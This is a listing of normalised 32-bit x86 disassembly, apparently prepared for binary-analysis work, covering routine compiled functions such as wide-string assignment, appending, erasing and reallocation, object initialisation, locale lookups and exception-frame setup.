lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
mov [ eax ] 0x0
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub_40b9b0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0xc ] 0x1
push esi
mov esi ecx
sete al
lea edx [ esi + 0x8 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ esi + 0x48 ] al
lea eax [ esi + 0x4 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x14 ]
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0x20 ] eax
lea eax [ esi + 0x24 ]
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x28 ]
mov [ esi + 0x30 ] eax
mov [ esi + 0x3d ] 0x0
mov [ esi + 0x10 ] edx
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] 0x0
mov eax [ esi + 0xc ]
mov [ eax ] 0x0
mov eax [ esi + 0x1c ]
mov [ eax ] 0x0
mov eax [ esi + 0x2c ]
mov [ eax ] 0x0
test edi edi
je r-xdata
mov eax [ rw-data ]
mov [ esi + 0x4c ] edi
mov [ esi + 0x40 ] eax
mov eax [ rw-data ]
pop edi
mov [ esi + 0x44 ] eax
mov [ esi + 0x38 ] 0x0
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x4 ]
mov [ ebp + 0xc ] 0x0
push eax
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] 0x0
push eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
push eax
push edi
call sub_416c55
mov eax [ ebp + 0xc ]
add esp 0x10
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
sub_40ba90
push ecx
push esi
mov esi ecx
push edi
cmp [ esi + 0x4c ] 0x0
jne r-xdata
call sub_40b7e0
push [ esi + 0x4c ]
xor ecx ecx
mov edi esi
test al al
cmove edi ecx
call sub_416d39
xor ecx ecx
add esp 0x4
test eax eax
cmovne edi ecx
xor edi edi
jmp r-xdata
lea eax [ esi + 0x4 ]
mov [ esi + 0x48 ] 0x0
mov [ esi + 0xc ] eax
lea ecx [ esi + 0x8 ]
lea eax [ esi + 0x14 ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x1c ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0x20 ] eax
lea eax [ esi + 0x24 ]
mov [ esi + 0x2c ] eax
lea eax [ esi + 0x28 ]
mov [ esi + 0x30 ] eax
mov [ esi + 0x3d ] 0x0
mov [ ecx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] 0x0
mov eax [ esi + 0xc ]
mov [ eax ] 0x0
mov eax edi
mov ecx [ esi + 0x1c ]
pop edi
mov [ ecx ] 0x0
mov ecx [ esi + 0x2c ]
mov [ ecx ] 0x0
mov ecx [ rw-data ]
mov [ esi + 0x40 ] ecx
mov ecx [ rw-data ]
mov [ esi + 0x4c ] 0x0
mov [ esi + 0x44 ] ecx
mov [ esi + 0x38 ] 0x0
pop esi
pop ecx
retn
sub_40bb50
push ebp
mov ebp esp
push 0xffffffff
push sub_42aa6e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40edbf
add esp 0xc
test eax eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_40b9b0
lea eax [ ebp - 0x18 ]
mov ecx esi
push eax
call sub_40bf90
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40ca70
add esp 0x4
mov ecx esi
push eax
call sub_40b750
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0xc
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
push 0x1
call [ edx ]
sub_40bc50
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push 0x8
push esi
call sub_40d57b
add esp 0x8
sub_40bc80
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
cmp eax 0x7fffffff
ja r-xdata
call sub_413b11
add eax eax
cmp eax 0x1000
jb r-xdata
push ecx
call j_sub_41a3a5
add esp 0x4
pop ebp
retn 0x8
test cl 0x1f
jne r-xdata
call sub_413b11
mov eax [ ecx - 0x4 ]
cmp eax ecx
jae r-xdata
call sub_413b11
sub ecx eax
cmp ecx 0x4
jb r-xdata
call sub_413b11
cmp ecx 0x23
ja r-xdata
call sub_413b11
mov ecx eax
sub_40bce0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0x7ffffffe
ja r-xdata
push r--data
call sub_40e50b
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ esi + 0x10 ]
push edi
call sub_40c160
xor eax eax
cmp eax edi
pop edi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
test edi edi
jne r-xdata
cmp edi 0x8
jae r-xdata
xor eax eax
cmp eax edi
pop edi
sbb eax eax
neg eax
pop esi
pop ebp
retn 0x8
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
push ebx
mov ebx [ esi + 0x10 ]
cmp edi ebx
cmovb ebx edi
cmp eax 0x8
jb r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ecx [ esi ]
mov [ ebp + 0xc ] ecx
test ebx ebx
je r-xdata
xor eax eax
mov [ esi + ebx * 2 ] ax
cmp eax edi
pop ebx
sbb eax eax
pop edi
neg eax
pop esi
pop ebp
retn 0x8
mov esi [ esi ]
mov eax [ esi + 0x14 ]
inc eax
push eax
push ecx
mov ecx esi
call sub_40bc80
lea eax [ ebx + ebx ]
push eax
push ecx
push esi
call sub_4117a0
mov ecx [ ebp + 0xc ]
add esp 0xc
sub_40bdb0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x10 ]
cmp edi ecx
jb r-xdata
push r--data
call sub_40e52b
mov edx [ ebp + 0xc ]
mov eax edi
sub eax ecx
cmp eax edx
ja r-xdata
test edx edx
je r-xdata
mov [ esi + 0x10 ] ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
xor edx edx
pop edi
pop esi
mov [ eax + ecx * 2 ] dx
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax + ecx * 2 ] dx
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
pop ebx
jb r-xdata
add eax eax
push eax
lea eax [ ebx + edx * 2 ]
push eax
push ebx
call sub_410380
add esp 0xc
sub edi edx
push ebx
lea ebx [ eax + ecx * 2 ]
mov eax edi
sub eax ecx
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax esi
pop edi
pop esi
pop ebp
retn 0x8
sub_40be60
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
mov edx [ esi + 0x10 ]
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
sub eax edx
cmp eax ecx
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x8
jb r-xdata
push r--data
call sub_40e50b
push ebx
lea ebx [ edx + ecx ]
test ecx ecx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp ebx 0x7ffffffe
ja r-xdata
cmp ecx 0x8
jb r-xdata
cmp edi eax
jb r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] ebx
jae r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
test ebx ebx
jne r-xdata
push edx
push ebx
mov ecx esi
call sub_40c160
mov ecx [ ebp + 0xc ]
test ebx ebx
je r-xdata
cmp ecx 0x8
jb r-xdata
mov eax [ esi + 0x10 ]
lea eax [ edx + eax * 2 ]
cmp eax edi
jbe r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
pop ebx
pop edi
pop esi
mov [ eax ] cx
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
pop ebx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
mov ecx esi
sar edi 0x1
push edi
push esi
call sub_40c320
pop edi
pop esi
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea eax [ ecx + ecx ]
push eax
mov eax [ esi + 0x10 ]
push edi
lea eax [ edx + eax * 2 ]
push eax
call sub_4117a0
add esp 0xc
test ecx ecx
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + ebx * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + ebx * 2 ] cx
mov eax esi
pop ebx
pop edi
pop esi
pop ebp
retn 0x8
sub_40bf90
push ebp
mov ebp esp
push 0xffffffff
push sub_42a646
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ecx + 0x34 ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ ecx ]
call [ edx + 0x4 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40bfe0
push ebp
mov ebp esp
push 0xffffffff
push sub_42a676
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x8
mov [ edi ] r--data
call sub_40d5ac
mov esi eax
push 0x1
mov [ ebp - 0x4 ] 0x0
call sub_40e7bd
mov [ esi + 0x4 ] eax
lea ecx [ edi + 0x8 ]
lea eax [ edi + 0x4 ]
mov [ edi + 0x34 ] esi
mov [ edi + 0xc ] eax
add esp 0x8
lea eax [ edi + 0x14 ]
mov [ edi + 0x10 ] ecx
mov [ edi + 0x1c ] eax
lea eax [ edi + 0x18 ]
mov [ edi + 0x20 ] eax
lea eax [ edi + 0x24 ]
mov [ edi + 0x2c ] eax
lea eax [ edi + 0x28 ]
mov [ edi + 0x30 ] eax
mov [ ecx ] 0x0
mov eax [ edi + 0x20 ]
mov [ eax ] 0x0
mov eax [ edi + 0x30 ]
mov [ eax ] 0x0
mov eax [ edi + 0xc ]
mov [ eax ] 0x0
mov eax [ edi + 0x1c ]
mov [ eax ] 0x0
mov eax [ edi + 0x2c ]
mov [ eax ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_40c0a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42aa9e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
call sub_4083d0
mov eax [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x38 ] eax
lea eax [ ebp - 0x14 ]
push eax
mov [ esi + 0x3c ] 0x0
call sub_408380
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40c4a0
add esp 0x4
mov edi eax
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x10 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx edi
mov eax [ edi ]
push 0x20
mov eax [ eax + 0x20 ]
call eax
cmp [ esi + 0x38 ] 0x0
mov [ esi + 0x40 ] al
jne r-xdata
mov edx [ ecx ]
call [ edx + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
mov ecx esi
or eax 0x4
push 0x0
push eax
call sub_4082b0
mov edx [ eax ]
mov ecx eax
push 0x1
call [ edx ]
sub_40c160
push ebp
mov ebp esp
push 0xffffffff
push sub_42aac0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov [ ebp - 0x14 ] esi
mov eax [ ebp + 0x8 ]
mov edi eax
or edi 0x7
cmp edi 0x7ffffffe
jbe r-xdata
mov ebx [ esi + 0x14 ]
mov eax 0xaaaaaaab
mul edi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov edi eax
jmp r-xdata
lea eax [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
jne r-xdata
mov eax 0x7ffffffe
lea edi [ ebx + ecx ]
sub eax ecx
cmp ebx eax
jbe r-xdata
cmp eax 0x7fffffff
jbe r-xdata
xor ebx ebx
jmp r-xdata
mov edi 0x7ffffffe
add eax eax
cmp eax 0x1000
jb r-xdata
call sub_40e4ee
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push eax
call sub_40d5ac
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x23 ]
cmp ecx eax
ja r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
call sub_413b11
push ecx
call sub_40d5ac
add esp 0x4
test eax eax
jne r-xdata
call sub_40e4ee
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
inc eax
mov ecx esi
push eax
push [ esi ]
call sub_40bc80
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
lea ebx [ eax + 0x23 ]
and ebx 0xffffffe0
mov [ ebx - 0x4 ] eax
jmp r-xdata
call sub_413b11
mov eax esi
mov eax [ esi ]
jmp r-xdata
add eax eax
push eax
push ecx
push ebx
call sub_4117a0
add esp 0xc
test eax eax
je r-xdata
xor ecx ecx
mov [ esi + eax * 2 ] cx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov esi ebx
xor ecx ecx
mov [ eax ] cx
mov eax [ ebp + 0xc ]
mov [ esi ] ebx
mov [ esi + 0x14 ] edi
mov [ esi + 0x10 ] eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_40c2db
mov esi [ ebp - 0x14 ]
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
inc eax
mov ecx esi
push eax
push [ esi ]
call sub_40bc80
xor eax eax
push eax
push eax
mov [ esi ] ax
call sub_4111b8
int3
mov esi [ esi ]
sub_40c320
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push edi
mov eax [ ebx + 0x10 ]
cmp eax ecx
jb r-xdata
push r--data
call sub_40e52b
mov edx [ esi + 0x10 ]
sub eax ecx
mov ecx [ ebp + 0x10 ]
cmp ecx eax
cmova ecx eax
or eax 0xffffffff
sub eax edx
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jbe r-xdata
push r--data
call sub_40e50b
lea edi [ edx + ecx ]
test ecx ecx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp edi 0x7ffffffe
ja r-xdata
push r--data
call sub_40e50b
cmp [ esi + 0x14 ] edi
jae r-xdata
test edi edi
jne r-xdata
push edx
push edi
mov ecx esi
call sub_40c160
mov ecx [ ebp + 0x10 ]
test edi edi
je r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebx ]
mov eax esi
xor ecx ecx
pop edi
pop esi
pop ebx
mov [ eax ] cx
pop ebp
retn 0xc
mov eax [ esi ]
xor ecx ecx
pop edi
mov [ eax ] cx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
lea eax [ ecx + ecx ]
push eax
mov eax [ ebp + 0xc ]
lea eax [ ebx + eax * 2 ]
push eax
mov eax [ esi + 0x10 ]
lea eax [ edx + eax * 2 ]
push eax
call sub_4117a0
add esp 0xc
test ecx ecx
je r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_40c430
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp eax 0x7fffffff
ja r-xdata
pop ebp
retn 0x4
call sub_40e4ee
add eax eax
cmp eax 0x1000
jb r-xdata
push eax
call sub_40d5ac
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ eax + 0x23 ]
cmp ecx eax
jbe r-xdata
jmp r-xdata
call sub_40e4ee
push ecx
call sub_40d5ac
mov ecx eax
add esp 0x4
test ecx ecx
je r-xdata
call sub_413b11
call sub_413b11
lea eax [ ecx + 0x23 ]
and eax 0xffffffe0
mov [ eax - 0x4 ] ecx
pop ebp
retn 0x4
sub_40c4a0
push ebp
mov ebp esp
push 0xffffffff
push sub_42aae8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_40e578
mov [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
mov [ ebp - 0x14 ] ebx
test edi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp edi [ ecx + 0xc ]
jae r-xdata
push edi
lea ecx [ ebp - 0x18 ]
call sub_40e578
cmp [ rw-data ] edi
jne r-xdata
xor esi esi
mov eax [ ecx + 0x8 ]
mov esi [ eax + edi * 4 ]
test esi esi
jne r-xdata
lea ecx [ ebp - 0x18 ]
call sub_40e5d0
mov edi [ rw-data ]
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
call sub_40e7b7
cmp edi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x1c ]
call sub_40e5d0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ eax + 0x8 ]
mov esi [ eax + edi * 4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call sub_407ba0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
mov esi [ ebp - 0x14 ]
mov ecx esi
mov [ rw-data ] esi
mov edx [ esi ]
call [ edx + 0x4 ]
push esi
call sub_40e789
add esp 0x4
xorps xmm0 xmm0
mov [ ebp - 0x28 ] r--data
push r--data
lea eax [ ebp - 0x28 ]
movq [ ebp - 0x24 ] xmm0
push eax
mov [ ebp - 0x24 ] r--data
call sub_4111b8
sub_40c5d0
push ebp
mov ebp esp
sub esp 0x8
push esi
push 0x7
mov esi ecx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
sub esp 0x8
mov [ ebp - 0x4 ] esi
call sub_40cc90
push eax
mov ecx esi
call sub_409de0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_40c600
push ebp
mov ebp esp
push 0xffffffff
push sub_42ab29
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x7
push r--data
mov ecx esi
call sub_40b440
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_40b570
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
mov [ eax ] 0x0
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov eax [ ebx + 0x10 ]
add eax 0x7
cmp edi eax
ja r-xdata
push 0x1
push eax
mov ecx esi
call sub_406f70
test al al
je r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_40c6e0
push ebp
mov ebp esp
sub esp 0x8
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] 0x0
push 0x9
push r--data
mov ecx edx
mov [ ebp - 0x4 ] edi
call sub_40be60
mov esi eax
mov [ edi + 0x14 ] 0x7
xor eax eax
mov [ edi + 0x10 ] 0x0
mov [ edi ] ax
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ esi ] 0x0
mov eax [ esi + 0x10 ]
add eax 0x1
je r-xdata
xor eax eax
mov [ esi ] ax
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ esi ]
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
add eax eax
push eax
push esi
push edi
call sub_410380
add esp 0xc
jmp r-xdata
sub_40c770
push ebp
mov ebp esp
push 0xffffffff
push sub_42ab69
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_40c320
push 0xc
push r--data
mov ecx esi
call sub_40be60
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
xor ecx ecx
mov [ eax ] cx
mov [ ebp - 0x4 ] ecx
mov eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax 0xc
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
push 0x1
push eax
mov ecx esi
call sub_40bce0
test al al
je r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_40c840
push ebp
mov ebp esp
push 0xffffffff
push sub_42ab69
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_40c320
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx esi
call sub_40c320
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
xor ecx ecx
mov [ eax ] cx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
mov [ ebp - 0x10 ] 0x1
add eax [ ecx + 0x10 ]
cmp edi eax
ja r-xdata
push 0x1
push eax
mov ecx esi
call sub_40bce0
test al al
je r-xdata
mov [ esi + 0x10 ] edi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_40c920
push ebp
mov ebp esp
push 0xffffffff
push sub_42ab9e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov esi ecx
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ebp - 0x18 ]
add ecx esi
push eax
call sub_408380
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40c4a0
add esp 0x4
mov edi eax
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx edi
mov eax [ edi ]
push 0xa
mov eax [ eax + 0x20 ]
call eax
mov [ ebp - 0x10 ] al
mov edx ebx
push [ ebp - 0x10 ]
mov ecx esi
call sub_40cf40
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
call [ edx + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
push 0x1
call [ edx ]
sub_40c9d0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
mov [ ebp - 0x8 ] 0x0
push 0x1
push r--data
mov ecx edx
mov [ ebp - 0x4 ] esi
call sub_40b440
push eax
mov ecx esi
call sub_409de0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_40ca00
push ebp
mov ebp esp
sub esp 0x8
mov eax [ edx + 0x14 ]
sub eax [ edx + 0x10 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
cmp [ ecx + 0x10 ] eax
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx edx
call sub_40b570
push eax
mov ecx esi
call sub_409de0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0x14 ]
sub eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
jb r-xdata
push 0xffffffff
push 0x0
push edx
push ecx
call sub_40cde0
push eax
mov ecx esi
call sub_409de0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_40ca70
push ebp
mov ebp esp
